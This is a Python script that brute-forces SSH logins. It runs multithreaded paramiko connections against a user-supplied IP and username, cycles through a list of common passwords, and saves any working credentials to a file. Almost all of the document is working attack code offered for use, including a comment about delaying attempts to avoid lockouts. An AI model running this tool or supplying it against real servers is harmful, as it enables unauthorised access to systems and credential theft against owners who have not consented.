import paramiko
import threading
import time
import logging
from queue import Queue
from paramiko.ssh_exception import AuthenticationException, SSHException

# Configure logging
logging.basicConfig(
    filename='ssh_bruteforce.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Thread-safe queue for password attempts
password_queue = Queue()

# Result flag to indicate when a successful attempt is made
found_flag = threading.Event()

# Worker function for SSH brute-force attempts
def ssh_worker(hostname, username, queue):
    while not queue.empty() and not found_flag.is_set():
        password = queue.get()
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname, username=username, password=password, timeout=5)
            print(f"Success: {password}")
            logging.info(f"Successful login with password: {password}")
            found_flag.set()  # Stop other threads once a success is found
            with open('ssh_success.txt', 'w') as f:
                f.write(f"Success: Host {hostname}, Username: {username}, Password: {password}\n")
            return True
        except AuthenticationException:
            print(f"Failed: {password}")
            logging.warning(f"Failed login with password: {password}")
        except SSHException as e:
            logging.error(f"SSH error: {e} - on password: {password}")
        except Exception as e:
            logging.error(f"Connection error: {e} - on password: {password}")
        finally:
            client.close()
        queue.task_done()

# Function to run the brute force attack
def ssh_brute_force(hostname, username, password_list, num_threads=5, delay=0):
    # Load passwords into the queue
    for password in password_list:
        password_queue.put(password)
    
    # Start worker threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=ssh_worker, args=(hostname, username, password_queue))
        threads.append(thread)
        thread.start()
    
    # Optionally add delay between attempts to avoid lockouts
    if delay > 0:
        time.sleep(delay)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    if not found_flag.is_set():
        print("All attempts failed.")
        logging.info("All attempts failed.")
        return False
    return True

# Main function
if __name__ == "__main__":
    target_host = input("Enter target IP: ")
    username = input("Enter SSH username: ")
    password_list = ["password123", "admin", "root", "toor", "Itachi", "letmein"]
    
    # Brute force with 5 threads and a 0.5-second delay between attempts
    ssh_brute_force(target_host, username, password_list, num_threads=5, delay=0.5)
